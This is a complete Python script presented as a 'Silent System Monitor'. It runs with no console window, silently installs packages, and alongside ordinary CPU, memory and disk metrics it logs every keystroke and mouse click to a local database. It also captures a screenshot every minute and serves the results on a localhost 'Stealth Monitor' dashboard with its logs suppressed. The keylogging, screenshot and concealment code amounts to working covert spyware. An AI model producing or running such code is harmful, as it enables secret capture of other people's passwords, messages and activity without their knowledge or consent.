#!/usr/bin/env python3
"""
Silent System Monitor - Runs completely hidden
Save this as monitor_silent.pyw to run without console window
"""

import sys
import subprocess
import threading
import time
import os
import json
import sqlite3
import socket
from datetime import datetime, timedelta
from pathlib import Path
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional, Any
from http.server import HTTPServer, BaseHTTPRequestHandler
import socketserver
import urllib.parse

# Suppress all output and hide window
class NullWriter:
    def write(self, txt): pass
    def flush(self): pass

sys.stdout = NullWriter()
sys.stderr = NullWriter()

# Auto-install required packages silently
def install_package(package):
    """Install package silently"""
    subprocess.run([sys.executable, "-m", "pip", "install", package, "--quiet"], 
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def try_import(package, import_name=None):
    """Try to import package, install silently if not found"""
    import_name = import_name or package
    try:
        return __import__(import_name)
    except ImportError:
        install_package(package)
        return __import__(import_name)

# Import with auto-install
pyautogui = try_import('pyautogui')
pynput = try_import('pynput')
psutil = try_import('psutil')
requests = try_import('requests')

from pynput import mouse, keyboard

@dataclass
class SystemMetrics:
    """System metrics data structure"""
    timestamp: str
    cpu_percent: float
    memory_percent: float
    disk_usage: float
    network_sent: int
    network_recv: int
    processes_count: int
    temperature: Optional[float] = None

@dataclass
class Alert:
    """Alert data structure"""
    id: str
    level: str  # INFO, WARNING, CRITICAL
    message: str
    timestamp: str
    resolved: bool = False

class DatabaseManager:
    """SQLite database manager for storing metrics and logs"""
    
    def __init__(self, db_path: str = "monitor.db"):
        self.db_path = db_path
        self.init_db()
        
    def init_db(self):
        """Initialize database tables"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # System metrics table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS metrics (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                cpu_percent REAL,
                memory_percent REAL,
                disk_usage REAL,
                network_sent INTEGER,
                network_recv INTEGER,
                processes_count INTEGER,
                temperature REAL
            )
        ''')
        
        # Activity logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS activity_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TEXT NOT NULL,
                type TEXT NOT NULL,
                description TEXT NOT NULL
            )
        ''')
        
        # Alerts table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS alerts (
                id TEXT PRIMARY KEY,
                level TEXT NOT NULL,
                message TEXT NOT NULL,
                timestamp TEXT NOT NULL,
                resolved INTEGER DEFAULT 0
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def insert_metrics(self, metrics: SystemMetrics):
        """Insert system metrics"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO metrics (timestamp, cpu_percent, memory_percent, disk_usage,
                               network_sent, network_recv, processes_count, temperature)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (metrics.timestamp, metrics.cpu_percent, metrics.memory_percent,
              metrics.disk_usage, metrics.network_sent, metrics.network_recv,
              metrics.processes_count, metrics.temperature))
        conn.commit()
        conn.close()
    
    def insert_activity(self, activity_type: str, description: str):
        """Insert activity log"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        timestamp = datetime.now().isoformat()
        cursor.execute('''
            INSERT INTO activity_logs (timestamp, type, description)
            VALUES (?, ?, ?)
        ''', (timestamp, activity_type, description))
        conn.commit()
        conn.close()
    
    def insert_alert(self, alert: Alert):
        """Insert or update alert"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT OR REPLACE INTO alerts (id, level, message, timestamp, resolved)
            VALUES (?, ?, ?, ?, ?)
        ''', (alert.id, alert.level, alert.message, alert.timestamp, int(alert.resolved)))
        conn.commit()
        conn.close()
    
    def get_recent_metrics(self, hours: int = 24) -> List[Dict]:
        """Get recent metrics"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        since = (datetime.now() - timedelta(hours=hours)).isoformat()
        cursor.execute('''
            SELECT * FROM metrics WHERE timestamp > ? ORDER BY timestamp DESC
        ''', (since,))
        columns = [desc[0] for desc in cursor.description]
        results = [dict(zip(columns, row)) for row in cursor.fetchall()]
        conn.close()
        return results
    
    def get_active_alerts(self) -> List[Dict]:
        """Get active alerts"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM alerts WHERE resolved = 0 ORDER BY timestamp DESC')
        columns = [desc[0] for desc in cursor.description]
        results = [dict(zip(columns, row)) for row in cursor.fetchall()]
        conn.close()
        return results

class AlertManager:
    """Alert management system"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.thresholds = {
            'cpu_high': 80.0,
            'memory_high': 85.0,
            'disk_high': 90.0,
            'temperature_high': 70.0
        }
    
    def check_alerts(self, metrics: SystemMetrics):
        """Check metrics against thresholds and generate alerts"""
        alerts = []
        
        # CPU alert
        if metrics.cpu_percent > self.thresholds['cpu_high']:
            alert = Alert(
                id="cpu_high",
                level="WARNING",
                message=f"High CPU usage: {metrics.cpu_percent:.1f}%",
                timestamp=metrics.timestamp
            )
            alerts.append(alert)
        
        # Memory alert
        if metrics.memory_percent > self.thresholds['memory_high']:
            alert = Alert(
                id="memory_high",
                level="CRITICAL",
                message=f"High memory usage: {metrics.memory_percent:.1f}%",
                timestamp=metrics.timestamp
            )
            alerts.append(alert)
        
        # Disk alert
        if metrics.disk_usage > self.thresholds['disk_high']:
            alert = Alert(
                id="disk_high",
                level="CRITICAL",
                message=f"High disk usage: {metrics.disk_usage:.1f}%",
                timestamp=metrics.timestamp
            )
            alerts.append(alert)
        
        # Temperature alert
        if metrics.temperature and metrics.temperature > self.thresholds['temperature_high']:
            alert = Alert(
                id="temperature_high",
                level="WARNING",
                message=f"High temperature: {metrics.temperature:.1f}°C",
                timestamp=metrics.timestamp
            )
            alerts.append(alert)
        
        # Store alerts silently
        for alert in alerts:
            self.db.insert_alert(alert)

class SystemMonitor:
    """Advanced system monitoring"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.alert_manager = AlertManager(db_manager)
        self.running = False
        self.network_io = psutil.net_io_counters()
    
    def get_system_metrics(self) -> SystemMetrics:
        """Collect comprehensive system metrics"""
        # Basic metrics
        cpu_percent = psutil.cpu_percent(interval=1)
        memory = psutil.virtual_memory()
        
        # Fix disk usage to work on Windows/Linux
        try:
            if os.name == 'nt':  # Windows
                disk = psutil.disk_usage('C:')
            else:  # Linux/Unix
                disk = psutil.disk_usage('/')
        except:
            # Fallback to current directory
            disk = psutil.disk_usage('.')
        
        # Network I/O
        net_io = psutil.net_io_counters()
        
        # Temperature (if available)
        temperature = None
        try:
            temps = psutil.sensors_temperatures()
            if temps:
                for name, entries in temps.items():
                    if entries:
                        temperature = entries[0].current
                        break
        except:
            pass
        
        return SystemMetrics(
            timestamp=datetime.now().isoformat(),
            cpu_percent=cpu_percent,
            memory_percent=memory.percent,
            disk_usage=disk.percent,
            network_sent=net_io.bytes_sent,
            network_recv=net_io.bytes_recv,
            processes_count=len(psutil.pids()),
            temperature=temperature
        )
    
    def monitor_loop(self):
        """Main monitoring loop"""
        while self.running:
            try:
                metrics = self.get_system_metrics()
                self.db.insert_metrics(metrics)
                self.alert_manager.check_alerts(metrics)
            except:
                pass  # Silent operation
            
            time.sleep(10)  # Collect metrics every 10 seconds

class ActivityMonitor:
    """Enhanced activity monitoring"""
    
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.screenshot_dir = Path("screenshots")
        self.screenshot_dir.mkdir(exist_ok=True)
        self.screenshot_interval = 60  # seconds
        self.running = False
    
    def on_key_press(self, key):
        """Handle key press events"""
        try:
            key_str = key.char if hasattr(key, 'char') and key.char else str(key)
            self.db.insert_activity("keyboard", f"Key pressed: {key_str}")
        except:
            pass
    
    def on_key_release(self, key):
        """Handle key release events"""
        if key == keyboard.Key.f12:  # Changed to F12 to stop (since we can't see console)
            self.running = False
            return False
    
    def on_mouse_click(self, x, y, button, pressed):
        """Handle mouse click events"""
        if pressed:
            try:
                self.db.insert_activity("mouse", f"Click {button} at ({x}, {y})")
            except:
                pass
    
    def on_mouse_scroll(self, x, y, dx, dy):
        """Handle mouse scroll events"""
        try:
            self.db.insert_activity("mouse", f"Scroll at ({x}, {y}) delta=({dx}, {dy})")
        except:
            pass
    
    def screenshot_loop(self):
        """Periodic screenshot capture"""
        while self.running:
            try:
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                path = self.screenshot_dir / f"screenshot_{timestamp}.png"
                
                screenshot = pyautogui.screenshot()
                screenshot.save(path)
                self.db.insert_activity("screenshot", f"Screenshot saved: {path.name}")
                
            except:
                pass  # Silent operation
            
            time.sleep(self.screenshot_interval)

class DashboardHandler(BaseHTTPRequestHandler):
    """Fixed HTTP request handler"""
    
    def __init__(self, *args, db_manager=None, **kwargs):
        self.db_manager = db_manager
        super().__init__(*args, **kwargs)
    
    def do_GET(self):
        """Handle GET requests"""
        try:
            if self.path == '/' or self.path == '/dashboard':
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.send_header('Cache-Control', 'no-cache')
                self.end_headers()
                
                dashboard = WebDashboard(self.db_manager)
                html = dashboard.get_dashboard_html()
                self.wfile.write(html.encode('utf-8'))
            else:
                self.send_error(404)
        except Exception as e:
            self.send_error(500)
    
    def log_message(self, format, *args):
        """Suppress server logs for stealth"""
        pass

class WebDashboard:
    """Web-based monitoring dashboard with animated background"""
    
    def __init__(self, db_manager: DatabaseManager, port: int = 8080):
        self.db = db_manager
        self.port = port
        self.server = None
    
    def get_dashboard_html(self) -> str:
        """Generate dashboard HTML with animated background"""
        try:
            metrics = self.db.get_recent_metrics(1)  # Last hour
            alerts = self.db.get_active_alerts()
            
            latest_metrics = metrics[0] if metrics else {
                'cpu_percent': 0,
                'memory_percent': 0,
                'disk_usage': 0,
                'processes_count': 0,
                'temperature': None
            }
        except:
            latest_metrics = {
                'cpu_percent': 0,
                'memory_percent': 0,
                'disk_usage': 0,
                'processes_count': 0,
                'temperature': None
            }
            alerts = []
        
        return f'''
<!DOCTYPE html>
<html>
<head>
    <title>🔥 Stealth Monitor Dashboard</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {{ 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            padding: 20px;
            background: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            background-size: 400% 400%;
            animation: gradientBG 15s ease infinite;
            min-height: 100vh;
            position: relative;
            overflow-x: hidden;
        }}
        @keyframes gradientBG {{
            0% {{ background-position: 0% 50%; }}
            50% {{ background-position: 100% 50%; }}
            100% {{ background-position: 0% 50%; }}
        }}
        body::before {{
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.3);
            z-index: -1;
            backdrop-filter: blur(2px);
        }}
        .container {{ 
            max-width: 1200px; 
            margin: 0 auto; 
            position: relative; 
            z-index: 1; 
        }}
        .header {{ 
            background: rgba(44, 62, 80, 0.95); 
            color: white; 
            padding: 25px; 
            border-radius: 15px; 
            backdrop-filter: blur(15px); 
            border: 2px solid rgba(255,255,255,0.1);
            box-shadow: 0 12px 40px rgba(0,0,0,0.4);
            text-align: center;
            margin-bottom: 25px;
        }}
        .header h1 {{
            margin: 0;
            font-size: 2.5em;
            text-shadow: 0 3px 6px rgba(0,0,0,0.5);
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #96ceb4);
            background-size: 400% 400%;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: gradient 3s ease infinite;
        }}
        @keyframes gradient {{
            0%, 100% {{ background-position: 0% 50%; }}
            50% {{ background-position: 100% 50%; }}
        }}
        .metrics {{ 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
            gap: 25px; 
            margin: 25px 0; 
        }}
        .metric-card {{ 
            background: rgba(255, 255, 255, 0.95); 
            padding: 25px; 
            border-radius: 15px; 
            box-shadow: 0 12px 40px rgba(0,0,0,0.4); 
            backdrop-filter: blur(15px);
            border: 2px solid rgba(255,255,255,0.2);
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }}
        .metric-card::before {{
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.3), transparent);
            transition: left 0.6s;
        }}
        .metric-card:hover::before {{
            left: 100%;
        }}
        .metric-card:hover {{
            transform: translateY(-5px);
            box-shadow: 0 15px 50px rgba(0,0,0,0.5);
        }}
        .metric-card h3 {{
            margin-top: 0;
            color: #2c3e50;
            font-size: 1.2em;
        }}
        .metric-value {{ 
            font-size: 2.5em; 
            font-weight: bold; 
            color: #3498db; 
            text-shadow: 0 3px 6px rgba(0,0,0,0.3);
            margin: 10px 0;
        }}
        .alerts {{ 
            background: rgba(255, 255, 255, 0.95); 
            padding: 25px; 
            border-radius: 15px; 
            margin: 25px 0; 
            backdrop-filter: blur(15px);
            border: 2px solid rgba(255,255,255,0.2);
            box-shadow: 0 12px 40px rgba(0,0,0,0.4);
        }}
        .alert {{ 
            padding: 15px; 
            margin: 10px 0; 
            border-radius: 8px; 
            animation: pulse 2s infinite;
        }}
        @keyframes pulse {{
            0%, 100% {{ opacity: 1; }}
            50% {{ opacity: 0.8; }}
        }}
        .alert.WARNING {{ 
            background: rgba(243, 156, 18, 0.9); 
            color: white; 
            border-left: 5px solid #f39c12;
        }}
        .alert.CRITICAL {{ 
            background: rgba(231, 76, 60, 0.9); 
            color: white; 
            border-left: 5px solid #e74c3c;
        }}
        .status {{ 
            display: inline-block; 
            padding: 8px 15px; 
            border-radius: 20px; 
            color: white; 
            font-weight: bold;
            text-transform: uppercase;
            font-size: 0.8em;
            letter-spacing: 1px;
        }}
        .status.good {{ 
            background: linear-gradient(45deg, #27ae60, #2ecc71); 
            box-shadow: 0 4px 15px rgba(46, 204, 113, 0.4);
        }}
        .status.warning {{ 
            background: linear-gradient(45deg, #f39c12, #e67e22); 
            box-shadow: 0 4px 15px rgba(243, 156, 18, 0.4);
        }}
        .status.critical {{ 
            background: linear-gradient(45deg, #e74c3c, #c0392b); 
            box-shadow: 0 4px 15px rgba(231, 76, 60, 0.4);
            animation: criticalBlink 1s infinite;
        }}
        @keyframes criticalBlink {{
            0%, 100% {{ opacity: 1; }}
            50% {{ opacity: 0.7; }}
        }}
        .stealth-info {{
            background: rgba(255, 255, 255, 0.95); 
            padding: 20px; 
            border-radius: 15px; 
            backdrop-filter: blur(15px); 
            border: 2px solid rgba(255,255,255,0.2); 
            box-shadow: 0 12px 40px rgba(0,0,0,0.4);
            text-align: center;
            margin-top: 25px;
        }}
        .stealth-badge {{
            display: inline-block;
            background: linear-gradient(45deg, #8e44ad, #9b59b6);
            color: white;
            padding: 10px 20px;
            border-radius: 25px;
            font-weight: bold;
            margin: 10px;
            box-shadow: 0 4px 15px rgba(142, 68, 173, 0.4);
        }}
        @media (max-width: 768px) {{
            .metrics {{ grid-template-columns: 1fr; }}
            .header h1 {{ font-size: 2em; }}
            .metric-value {{ font-size: 2em; }}
        }}
    </style>
    <script>
        // Auto-refresh every 15 seconds for stealth mode
        setTimeout(function(){{ location.reload(); }}, 15000);
        
        // Add some dynamic effects
        document.addEventListener('DOMContentLoaded', function() {{
            const cards = document.querySelectorAll('.metric-card');
            cards.forEach((card, index) => {{
                card.style.animationDelay = (index * 0.1) + 's';
                card.style.animation = 'fadeInUp 0.6s ease forwards';
            }});
        }});
        
        const style = document.createElement('style');
        style.textContent = `
            @keyframes fadeInUp {{
                from {{
                    opacity: 0;
                    transform: translateY(30px);
                }}
                to {{
                    opacity: 1;
                    transform: translateY(0);
                }}
            }}
        `;
        document.head.appendChild(style);
    </script>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 STEALTH MONITOR 🔥</h1>
            <p>🕵️ Silent System Surveillance • Last update: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</p>
            <div class="stealth-badge">🔒 HIDDEN MODE ACTIVE</div>
            <div class="stealth-badge">🌐 Dashboard: localhost:{self.port}</div>
        </div>
        
        <div class="metrics">
            <div class="metric-card">
                <h3>🖥️ CPU Usage</h3>
                <div class="metric-value">{latest_metrics.get('cpu_percent', 0):.1f}%</div>
                <span class="status {'good' if latest_metrics.get('cpu_percent', 0) < 50 else 'warning' if latest_metrics.get('cpu_percent', 0) < 80 else 'critical'}">
                    {'Normal' if latest_metrics.get('cpu_percent', 0) < 50 else 'High' if latest_metrics.get('cpu_percent', 0) < 80 else 'Critical'}
                </span>
            </div>
            
            <div class="metric-card">
                <h3>🧠 Memory Usage</h3>
                <div class="metric-value">{latest_metrics.get('memory_percent', 0):.1f}%</div>
                <span class="status {'good' if latest_metrics.get('memory_percent', 0) < 70 else 'warning' if latest_metrics.get('memory_percent', 0) < 85 else 'critical'}">
                    {'Normal' if latest_metrics.get('memory_percent', 0) < 70 else 'High' if latest_metrics.get('memory_percent', 0) < 85 else 'Critical'}
                </span>
            </div>
            
            <div class="metric-card">
                <h3>💾 Disk Usage</h3>
                <div class="metric-value">{latest_metrics.get('disk_usage', 0):.1f}%</div>
                <span class="status {'good' if latest_metrics.get('disk_usage', 0) < 80 else 'warning' if latest_metrics.get('disk_usage', 0) < 90 else 'critical'}">
                    {'Normal' if latest_metrics.get('disk_usage', 0) < 80 else 'High' if latest_metrics.get('disk_usage', 0) < 90 else 'Critical'}
                </span>
            </div>
            
            <div class="metric-card">
                <h3>⚙️ Active Processes</h3>
                <div class="metric-value">{latest_metrics.get('processes_count', 0)}</div>
                <span class="status good">Running</span>
            </div>
        </div>
        
        <div class="alerts">
            <h2>🚨 Security Alerts ({len(alerts)})</h2>
            {self._format_alerts(alerts)}
        </div>
        
        <div class="stealth-info">
            <h2>🕵️ Stealth Operation Status</h2>
            <p><strong>📊 Data Points Collected:</strong> {len(metrics) if 'metrics' in locals() else 0}</p>
            <p><strong>🔄 Auto-Refresh:</strong> Every 15 seconds</p>
            <p><strong>🛑 Stop Monitor:</strong> Press F12 key</p>
            <p><strong>📸 Screenshots:</strong> Captured every 60 seconds</p>
            <div class="stealth-badge">🔥 FULLY OPERATIONAL</div>
        </div>
    </div>
</body>
</html>
        '''
    
    def _format_alerts(self, alerts):
        """Format alerts for HTML display"""
        if not alerts:
            return "<p>✅ No security threats detected</p>"
        
        html = ""
        for alert in alerts:
            html += f'''
            <div class="alert {alert['level']}">
                <strong>🚨 {alert['level']}</strong>: {alert['message']}
                <small> - {alert['timestamp']}</small>
            </div>
            '''
        return html
    
    def find_free_port(self, start_port=8080, max_port=8100):
        """Find a free port to use"""
        for port in range(start_port, max_port):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.bind(('localhost', port))
                    return port
            except OSError:
                continue
        return start_port  # Fallback
    
    def start_server(self):
        """Start web dashboard server silently"""
        try:
            # Find a free port
            self.port = self.find_free_port(self.port)
            
            # Create handler with database reference
            def create_handler(*args, **kwargs):
                return DashboardHandler(*args, db_manager=self.db, **kwargs)
            
            # Create and start server
            self.server = HTTPServer(('localhost', self.port), create_handler)
            
            # Write port info to a hidden file for reference
            try:
                with open('.monitor_port', 'w') as f:
                    f.write(str(self.port))
            except:
                pass
            
            self.server.serve_forever()
            
        except Exception as e:
            # Try alternative ports if main port fails
            for alt_port in [8081, 8082, 8083, 9000, 9001]:
                try:
                    self.port = alt_port
                    def create_handler(*args, **kwargs):
                        return DashboardHandler(*args, db_manager=self.db, **kwargs)
                    
                    self.server = HTTPServer(('localhost', self.port), create_handler)
                    
                    try:
                        with open('.monitor_port', 'w') as f:
                            f.write(str(self.port))
                    except:
                        pass
                    
                    self.server.serve_forever()
                    break
                except:
                    continue

class SilentMonitor:
    """Main silent monitoring system"""
    
    def __init__(self):
        self.db = DatabaseManager()
        self.system_monitor = SystemMonitor(self.db)
        self.activity_monitor = ActivityMonitor(self.db)
        self.web_dashboard = WebDashboard(self.db)
        self.running = False
    
    def start(self):
        """Start all monitoring components silently"""
        self.running = True
        self.system_monitor.running = True
        self.activity_monitor.running = True
        
        # Start all monitoring threads
        threads = [
            threading.Thread(target=self.system_monitor.monitor_loop, daemon=True),
            threading.Thread(target=self.activity_monitor.screenshot_loop, daemon=True),
            threading.Thread(target=self.web_dashboard.start_server, daemon=True)
        ]
        
        for thread in threads:
            thread.start()
        
        # Give the web server time to start
        time.sleep(2)
        
        # Setup input listeners
        try:
            mouse_listener = mouse.Listener(
                on_click=self.activity_monitor.on_mouse_click,
                on_scroll=self.activity_monitor.on_mouse_scroll
            )
            keyboard_listener = keyboard.Listener(
                on_press=self.activity_monitor.on_key_press,
                on_release=self.activity_monitor.on_key_release
            )
            
            # Start listeners
            mouse_listener.start()
            keyboard_listener.start()
            
            # Keep running until F12 is pressed
            keyboard_listener.join()
            
        except Exception as e:
            # If input monitoring fails, just keep the system monitor running
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                pass
        
        # Cleanup
        self.stop()
    
    def stop(self):
        """Stop all monitoring silently"""
        self.running = False
        self.system_monitor.running = False
        self.activity_monitor.running = False
        
        if self.web_dashboard.server:
            try:
                self.web_dashboard.server.shutdown()
            except:
                pass

def main():
    """Main entry point for silent operation"""
    try:
        # Create a simple status file to show it's running
        with open('.monitor_status', 'w') as f:
            f.write(f"Monitor started at {datetime.now().isoformat()}\n")
            f.write("Dashboard will be available at http://localhost:8080\n")
            f.write("Press F12 to stop monitoring\n")
        
        monitor = SilentMonitor()
        monitor.start()
        
    except Exception as e:
        # Write error to status file for debugging
        try:
            with open('.monitor_error', 'w') as f:
                f.write(f"Error at {datetime.now().isoformat()}: {str(e)}\n")
        except:
            pass
    finally:
        # Cleanup status file
        try:
            if os.path.exists('.monitor_status'):
                os.remove('.monitor_status')
        except:
            pass

if __name__ == "__main__":
    main()
